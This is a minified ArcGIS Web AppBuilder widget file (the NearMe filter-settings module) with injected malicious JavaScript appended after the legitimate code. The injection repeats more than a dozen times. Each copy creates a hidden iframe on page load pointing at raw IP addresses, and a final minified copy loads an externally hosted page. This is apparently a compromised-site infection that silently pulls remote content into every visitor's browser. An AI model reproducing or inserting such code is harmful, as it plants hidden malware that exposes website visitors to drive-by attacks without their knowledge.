// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/NearMe/setting/FilterSetting.html":'\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"esriCTFilterMsg"\x3e${nls.filterSetting.addTaskTip}\x3c/div\x3e\r\n\t\x3cdiv class\x3d"content"\x3e\r\n\t\t\x3cdiv class\x3d"items-list jimu-not-selectable"\x3e\r\n\t\t\t\x3cdiv class\x3d"add-btn" data-dojo-attach-event\x3d"click:_onBtnAddItemClicked"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"icon"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3cdiv class\x3d"tip"\x3e${nls.filterSetting.newFilter}\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3cdiv class\x3d"items-list-content" data-dojo-attach-point\x3d"listContent" data-dojo-attach-event\x3d"click:_onListContentClicked"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"separator not-visible" data-dojo-attach-point\x3d"separator"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"single-setting-content" data-dojo-attach-point\x3d"singleSettingContent"\x3e\r\n\t\t\t\x3cdiv class\x3d"no-task-tip" data-dojo-attach-point\x3d"noTaskTip"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv class\x3d"collapse-option" \x3e\r\n\t\t\x3cdiv class\x3d"jimu-float-leading" data-dojo-attach-point\x3d"cbxCollapseFilters"\x3e\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"shelter" data-dojo-type\x3d"jimu/dijit/LoadingShelter" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/on dojo/query dojo/_base/html dojo/_base/lang dojo/_base/array dojo/_base/declare dijit/_WidgetsInTemplateMixin dojo/text!./FilterSetting.html esri/lang jimu/utils jimu/BaseWidgetSetting ./SingleFilterSetting jimu/LayerInfos/LayerInfos jimu/dijit/CheckBox jimu/dijit/LoadingShelter".split(" "),function(g,f,b,d,e,h,k,l,m,n,p,q,r,t){return h([p,k],{baseClass:"jimu-widget-nearme-filter-setting",templateString:l,singleSetting:null,layerChooserSelect:null,layerInfosObj:null,selectedSearchLayers:[],
postMixInProperties:function(){this.jimuNls=window.jimuNls;this.layerInfosObj=r.getInstanceSync();this.config&&(this.config=this._getConfigWithValidDataSource(this.config));this.noTaskNls=this.nls.filterSetting.noTasksTip;this.noTaskNls=m.substitute({newFilter:"\x3cspan\x3e"+this.nls.filterSetting.newFilter+"\x3c/span\x3e"},this.noTaskNls)},_getConfigWithValidDataSource:function(a){a.filterSettings||(a.filterSettings={},a.filterSettings.filters=[],a.filterSettings.collapse=!1);a.filterSettings.filters=
e.filter(a.filterSettings.filters,d.hitch(this,function(a){return a.layerId?!!this.layerInfosObj.getLayerInfoById(a.layerId):!0}));return a},postCreate:function(){this.inherited(arguments);this.selectedSearchLayers=[];this.noTaskTip.innerHTML=this.noTaskNls;this.updateLayerOptions();this.config&&this.setConfig(this.config);this.cbxCollapseFilterExp=new t({"class":"esriCTFilterLabel",label:this.nls.filterSetting.collapseFiltersTip||""});this.cbxCollapseFilterExp.placeAt(this.cbxCollapseFilters);this.cbxCollapseFilterExp.setValue(!1)},
_onListContentClicked:function(a){a=a.target||a.srcElement;var c=n.getAncestorDom(a,function(a){return b.hasClass(a,"item")},3);c&&(b.hasClass(a,"action")?b.hasClass(a,"up")?c.previousElementSibling&&b.place(c,c.previousElementSibling,"before"):b.hasClass(a,"down")?c.nextElementSibling&&b.place(c,c.nextElementSibling,"after"):b.hasClass(a,"delete")&&(this._deleteItem(c),this._resetSelection()):this.singleSetting?this.singleSetting.target!==c&&this.singleSetting.getConfig()&&(this.singleSetting.destroy(),
this.singleSetting=null,this._createSingleSetting(c)):this._createSingleSetting(c))},_onBtnAddItemClicked:function(){if(this.singleSetting)if(this.singleSetting.getConfig())this.singleSetting.destroy(),this.singleSetting=null;else return;var a=this._createTarget();this._createSingleSetting(a,null)},_createSingleSetting:function(a){f(".item",this.listContent).removeClass("selected");this.singleSetting&&this.singleSetting.destroy();this.singleSetting=null;this.singleSetting=new q({map:this.map,nls:this.nls,
target:a,folderUrl:this.folderUrl,layerInfosObj:this.layerInfosObj,selectedSearchLayers:this.selectedSearchLayers});this.singleSetting.placeAt(this.singleSettingContent);this.own(g(this.singleSetting,"loading",d.hitch(this,function(){this.shelter.show()})));this.own(g(this.singleSetting,"unloading",d.hitch(this,function(){this.shelter.hide()})));this.own(g(this.singleSetting,"before-destroy",d.hitch(this,function(){b.addClass(this.separator,"not-visible")})));b.addClass(a,"selected");a.singleConfig?
this.singleSetting.setConfig(a.singleConfig):setTimeout(d.hitch(this,function(){this.singleSetting.showLayerChooserPopup()}),50);b.removeClass(this.separator,"not-visible");b.addClass(this.noTaskTip,"not-visible")},_createTarget:function(a){a=a||"";return b.create("div",{"class":"item",innerHTML:'\x3cdiv class\x3d"label jimu-ellipsis" title\x3d"'+a+'"\x3e'+a+'\x3c/div\x3e\x3cdiv class\x3d"actions jimu-float-trailing"\x3e\x3cdiv class\x3d"delete action jimu-float-trailing"\x3e\x3c/div\x3e\x3cdiv class\x3d"down action jimu-float-trailing"\x3e\x3c/div\x3e\x3cdiv class\x3d"up action jimu-float-trailing"\x3e\x3c/div\x3e\x3c/div\x3e'},
this.listContent)},_updateNoQueryTip:function(){0<f(".item",this.listContent).length?b.addClass(this.noTaskTip,"not-visible"):b.removeClass(this.noTaskTip,"not-visible")},setConfig:function(a){var c=null;e.forEach(a.filterSettings.filters,d.hitch(this,function(a,b){var d=this._createTarget(a.name);d.singleConfig=a;0===b&&(c=d)}));c&&this._createSingleSetting(c);this._updateNoQueryTip()},getConfig:function(){if(this.singleSetting&&!this.singleSetting.getConfig())return!1;var a=f(".item",this.listContent),
c={collapse:this.cbxCollapseFilterExp.getValue(),filters:[]};c.filters=e.map(a,d.hitch(this,function(a){return a.singleConfig}));return c},destroy:function(){this.singleSetting&&this.singleSetting.destroy();this.singleSetting=null;this.inherited(arguments)},updateLayerOptions:function(a){var c=[],b;e.forEach(a||this.config.searchLayers,d.hitch(this,function(a){c.push(a.id)}));this.selectedSearchLayers=c;this.singleSetting&&this.singleSetting.updateLayerOptions(this.selectedSearchLayers);a=f(".item",
this.listContent);b=[];e.forEach(a,d.hitch(this,function(a){(!a.singleConfig||0>this.selectedSearchLayers.indexOf(a.singleConfig.layerId))&&b.push(a)}));e.forEach(b,d.hitch(this,function(a){this._deleteItem(a)}));this._resetSelection()},_deleteItem:function(a){a&&(this.singleSetting&&this.singleSetting.target===a&&(this.singleSetting.destroy(),this.singleSetting=null),b.destroy(a))},_resetSelection:function(){var a=f(".item",this.listContent);0<a.length&&this._createSingleSetting(a[0]);this._updateNoQueryTip()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});